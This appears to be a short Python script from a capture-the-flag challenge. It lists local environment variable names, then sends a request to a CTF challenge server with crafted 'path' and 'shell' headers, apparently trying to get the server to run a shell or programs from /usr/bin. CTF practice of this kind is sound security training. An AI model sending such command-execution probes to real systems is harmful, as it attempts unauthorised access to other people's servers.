import requests

### Find Python environment variables
import os
#print(os.environ)
for name in list(os.environ):
    #if "PYTHON" in name:
        print(name)

url = 'http://chals.ctf.sg:15301/'
headers = {
    'path': '/usr/bin/',
    'shell':'1'
    }

r = requests.get(url, headers=headers)
print("#"*80)
print(r.text)
